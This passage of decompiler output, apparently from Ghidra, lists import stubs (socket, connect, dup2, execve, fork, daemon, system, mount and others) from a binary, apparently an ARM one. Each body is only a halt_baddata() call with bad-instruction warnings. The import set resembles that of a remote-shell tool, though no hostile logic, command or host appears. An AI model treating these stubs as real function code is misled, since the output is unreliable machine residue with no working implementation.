{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === pthread_attr_init @ 00017040 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_attr_init(pthread_attr_t *__attr)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === pthread_attr_setdetachstate @ 00017044 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_attr_setdetachstate(pthread_attr_t *__attr,int __detachstate)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === pthread_create @ 00017048 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_create(pthread_t *__newthread,pthread_attr_t *__attr,__start_routine *__start_routine,
                  void *__arg)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === bsd_signal @ 0001704c === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

__sighandler_t bsd_signal(int __sig,__sighandler_t __handler)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === sleep @ 00017050 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

uint sleep(uint __seconds)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === geteuid @ 00017054 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

__uid_t geteuid(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === system @ 00017058 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int system(char *__command)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === unlink @ 0001705c === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int unlink(char *__name)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === fork @ 00017060 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

__pid_t fork(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === daemon @ 00017064 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int daemon(int __nochdir,int __noclose)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === fopen @ 00017068 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

FILE * fopen(char *__filename,char *__modes)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === strlen @ 0001706c === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

size_t strlen(char *__s)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === fgets @ 00017070 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

char * fgets(char *__s,int __n,FILE *__stream)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === fgetc @ 00017074 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int fgetc(FILE *__stream)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === memcmp @ 00017078 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int memcmp(void *__s1,void *__s2,size_t __n)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === mount @ 0001707c === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int mount(char *__special_file,char *__dir,char *__fstype,ulong __rwflag,void *__data)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === fclose @ 00017080 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int fclose(FILE *__stream)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === fwrite @ 00017084 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

size_t fwrite(void *__ptr,size_t __size,size_t __n,FILE *__s)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === chmod @ 00017088 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int chmod(char *__file,__mode_t __mode)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === stat @ 0001708c === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int stat(char *__file,stat *__buf)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === socket @ 00017090 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int socket(int __domain,int __type,int __protocol)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === inet_addr @ 00017094 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

in_addr_t inet_addr(char *__cp)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === connect @ 00017098 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int connect(int __fd,sockaddr *__addr,socklen_t __len)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === close @ 0001709c === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int close(int __fd)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === malloc @ 000170a0 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * malloc(size_t __size)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === send @ 000170a4 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ssize_t send(int __fd,void *__buf,size_t __n,int __flags)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === poll @ 000170a8 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int poll(pollfd *__fds,nfds_t __nfds,int __timeout)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === recv @ 000170ac === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ssize_t recv(int __fd,void *__buf,size_t __n,int __flags)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === pipe @ 000170b0 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pipe(int *__pipedes)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === pthread_rwlock_rdlock @ 000170b4 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_rwlock_rdlock(pthread_rwlock_t *__rwlock)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === pthread_rwlock_unlock @ 000170b8 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_rwlock_unlock(pthread_rwlock_t *__rwlock)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === dup2 @ 000170bc === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int dup2(int __fd,int __fd2)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === execve @ 000170c0 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int execve(char *__path,char **__argv,char **__envp)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === _exit @ 000170c4 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void _exit(int __status)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === fdopen @ 000170c8 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

FILE * fdopen(int __fd,char *__modes)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === pthread_rwlock_wrlock @ 000170d0 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_rwlock_wrlock(pthread_rwlock_t *__rwlock)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === waitpid @ 000170d4 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

__pid_t waitpid(__pid_t __pid,int *__stat_loc,int __options)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === memmem @ 000170d8 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * memmem(void *__haystack,size_t __haystacklen,void *__needle,size_t __needlelen)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === strtol @ 000170dc === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

long strtol(char *__nptr,char **__endptr,int __base)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === open @ 000170e0 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int open(char *__file,int __oflag,...)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === time @ 000170e4 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

time_t time(time_t *__timer)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === fread @ 000170e8 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

size_t fread(void *__ptr,size_t __size,size_t __n,FILE *__stream)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === sscanf @ 000170ec === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int sscanf(char *__s,char *__format,...)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === __gnu_Unwind_Find_exidx @ 000170f0 === */

/* WARNING: Control flow encountered bad instruction data */

void __gnu_Unwind_Find_exidx(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === abort @ 000170f4 === */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void abort(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === __cxa_begin_cleanup @ 000170f8 === */

/* WARNING: Control flow encountered bad instruction data */

void __cxa_begin_cleanup(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === __cxa_type_match @ 000170fc === */

/* WARNING: Control flow encountered bad instruction data */

void __cxa_type_match(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === __cxa_call_unexpected @ 00017100 === */

/* WARNING: Control flow encountered bad instruction data */

void __cxa_call_unexpected(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}

